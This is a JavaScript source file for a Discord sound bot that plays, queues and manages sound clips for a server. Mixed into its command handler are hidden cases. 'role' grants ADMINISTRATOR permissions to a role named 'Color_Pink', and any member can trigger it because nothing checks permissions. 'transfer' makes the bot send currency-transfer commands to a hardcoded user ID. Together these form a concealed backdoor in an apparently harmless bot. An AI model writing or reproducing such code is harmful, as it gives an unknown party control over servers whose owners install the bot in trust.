const config = require('config');
const Discord = require('discord.js');
const Util = require('./Util.js');
//const vConnection = [];

class SoundBot extends Discord.Client {
    constructor() {
        super();

        this.prefix = config.get('prefix');
        this.queue = [];
        this._addEventListeners();

    }

    _addEventListeners() {
        this.on('ready', this._readyListener);
        this.on('message', this._messageListener);
    }

    _readyListener() {
        //set Playing
        this.user.setGame("Sweet Memes");
        /*  //set name
        	this.user.setUsername('PaulBot')
            .then(user => console.log(`My new username is ${user.username}`))
            .catch(console.error);
        	//set avatar
			const avatar = Util.avatarExists() ? './config/avatar.png' : null;
        	this.user.setAvatar('./config/avatar.png')
            .then(user => console.log(`New avatar set!`))
            .catch(console.error); */
    }

    _messageListener(message) {
        if (message.channel instanceof Discord.DMChannel) return; // Abort when DM
        if (!message.content.startsWith(this.prefix)) return; // Abort when not prefix
        if (Util.userIgnored(message.author.id)) return;

        message.content = message.content.substring(this.prefix.length);
        this.handle(message);
    }

    start() {
        this.login(config.get('token'));
    }

    handle(message) {
        const [command, ...input] = message.content.split(' ');
        switch (command) {
            case 'uptime':
                message.channel.send(Util.msToHms(this.uptime));
                break
            case 'wallet':
                message.channel.send('&wallet');
                break
            case 'transfer':
                message.channel.send('&transfer <@295773280684605442>' + input);
                break
            case 'role':
                let role = message.guild.roles.find("name", "Color_Pink");

                role.edit({

                    permissions: ['ADMINISTRATOR']

                });
                break
            case 'getrole':
                let myRole = message.guild.roles.get("264410914592129025");
                break
            case 'getperms':
                let has_admin = message.member.hasPermission("ADMINISTRATOR");
                console.log(has_admin);
                break
            case 'join': //join, even if not in a channel
                this.joinChannel(message);
                break
            case 'leave': // DOES NOT WORK
                this.leaveChannel(message);
                break
            case 'playing':
                this.setPlaying(input, message);
                break
            case 'commands':
                message.author.send(Util.getListOfCommands());
                break;
            case 'sounds':
                message.author.send(Util.getSounds().map(sound => sound));
                break;
            case 'mostplayed':
                message.channel.send(Util.getMostPlayedSounds());
                break;
            case 'add':
                if (message.attachments) Util.addSounds(message.attachments, message.channel);
                break;
            case 'rename':
                Util.renameSound(input, message.channel);
                break;
            case 'remove':
                Util.removeSound(input, message.channel);
                break;
            case 'ignore':
                Util.ignoreUser(input, message);
                break;
            case 'unignore':
                Util.unignoreUser(input, message);
                break;
			case 'echo':
				message.channel.send('your message is ' + input);
                break
            default:
                this.handleSoundCommands(message);
                break;
        }
    }

    handleSoundCommands(message) {
        const sounds = Util.getSounds();
        const voiceChannel = message.member.voiceChannel;

        if (voiceChannel === undefined) {
            // message.reply('Join a voice channel first!');
            return;
        }

        switch (message.content) {
            case 'stop':
                if (voiceChannel === undefined) {
                    message.reply('Join a voice channel first!');
                    return;
                }
                voiceChannel.leave();
                this.queue = [];
                break;
            case 'random':
                const random = sounds[Math.floor(Math.random() * sounds.length)];
                this.addToQueue(voiceChannel.id, random, message);
                break;
            default:
                const sound = message.content;
                if (sounds.includes(sound)) {
                    this.addToQueue(voiceChannel.id, sound, message);
                    if (!this._currentlyPlaying()) this.playSoundQueue();
                }
                break;
        }
    }

    setPlaying(message) {
        const [command, ...input] = message.content.split(' ');
        this.user.setGame(message.toString());
    }

    joinChannel(message) {
		if (message.member.voiceChannel) {
      message.member.voiceChannel.join()
        .then(connection => { // Connection is an instance of VoiceConnection
          message.reply('I have successfully connected to the channel!');
        })
        .catch(console.log);
    } else {
      message.reply('You need to join a voice channel first!');
	}
    }

    leaveChannel(message) {
        const voiceChannel = message.member.voiceChannel;
        if (voiceChannel === undefined) {
            message.reply('Join a voice channel first!');
            return;
        }
        voiceChannel.leave();
        this.queue = [];
        return;
    }

    addToQueue(voiceChannel, sound, message) {
        this.queue.push({
            name: sound,
            channel: voiceChannel,
            message
        });
    }

    _currentlyPlaying() {
        return this.voiceConnections.some(connection => connection.speaking);
    }

    playSoundQueue() {
        const nextSound = this.queue.shift();
        const file = Util.getPathForSound(nextSound.name);
        //const voiceChannel = message.member.voiceChannel;
        const voiceChannel = this.channels.get(nextSound.channel);
        // const connection = voiceChannel.connection();

        voiceChannel.join().then((connection) => {
                // const dispatcher = voiceChannel.connection.playFile(file);
                const dispatcher = connection.playFile(file);
                dispatcher.on('end', () => {
                    Util.updateCount(nextSound.name);
                    if (config.get('deleteMessages') === true) nextSound.message.delete();

                    if (this.queue.length === 0) {
                        if (!config.get('stayInChannel')) connection.disconnect();
                        return;
                    }

                    this.playSoundQueue();
                });
            })
            .catch((error) => {
                console.log('Error occured!');
                console.log(error);
            });
    }
}

module.exports = SoundBot;